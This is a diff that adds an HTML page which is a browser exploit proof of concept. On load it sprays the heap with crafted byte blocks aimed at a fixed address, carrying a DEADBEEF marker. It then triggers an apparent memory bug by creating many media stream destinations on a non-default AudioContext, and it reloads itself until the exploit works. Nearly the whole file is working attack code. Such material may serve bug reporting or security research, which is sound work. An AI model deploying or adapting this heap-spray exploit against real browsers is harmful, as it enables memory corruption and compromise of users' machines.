@@ -1,0 +1,52 @@
+<!doctype html>
+<script>
+  window.onload = fExploit;
+  
+  function fExploit() {
+    fSprayHeap(0x5a5a5a5a, [
+      0x00, 0x00, 0x08, 0x28,
+      0x04, 0x00, 0x08, 0x28,
+      0x08, 0x00, 0x08, 0x28,
+      0x0C, 0x00, 0x08, 0x28,
+      0x10, 0x00, 0x08, 0x28,
+      0x14, 0x00, 0x08, 0x28,
+      0x18, 0x00, 0x08, 0x28,
+      0x1C, 0x00, 0x08, 0x28,
+      0x20, 0x00, 0x08, 0x28,
+      0x24, 0x00, 0x08, 0x28,
+      0xEF, 0xBE, 0xAD, 0xDE, // DEADBEEF
+      0x2C, 0x00, 0x08, 0x28,
+      0x30, 0x00, 0x08, 0x28,
+      0x34, 0x00, 0x08, 0x28,
+      0x38, 0x00, 0x08, 0x28,
+      0x3C, 0x00, 0x08, 0x28,
+    ]);
+    fTriggerBug();
+    fRestartIfNotExploited(20);
+  }
+  function fSprayHeap(uTargetAddress, auSprayBytes) {
+    var uBlockSize = 0x1000000;
+    var aauHeap = fSprayHeap.aauHeap = []; // Store as property of function to keep it from being garbage collected.
+    var uCurrentAddress = 0x08000000;
+    while (uCurrentAddress < uTargetAddress) {
+      var auHeapBlock = new Uint8Array(uBlockSize - 0x100);
+      for (var uOffset = uTargetAddress & 0xFFFFF; uOffset < uBlockSize; uOffset += 0x100000) {
+        for (var uIndex = 0; uIndex < auSprayBytes.length; uIndex++) {
+          auHeapBlock[uOffset + uIndex] = auSprayBytes[uIndex];
+        };
+      };
+      aauHeap.push(auHeapBlock);
+      uCurrentAddress += uBlockSize;
+    };
+  };
+  
+  function fTriggerBug() {
+    // any audio context other than "normal" will do.
+    var oAudioContext = new AudioContext("content"); // "notification", "alarm", "telephony", "ringer", "publicnotification"
+    for (var i = 0; i < 0x100; i++) oAudioContext.createMediaStreamDestination();
+  };
+  
+  function fRestartIfNotExploited(uTimeoutInSeconds) {
+    setTimeout("location.reload()", uTimeoutInSeconds * 1000);
+  };
+</script>
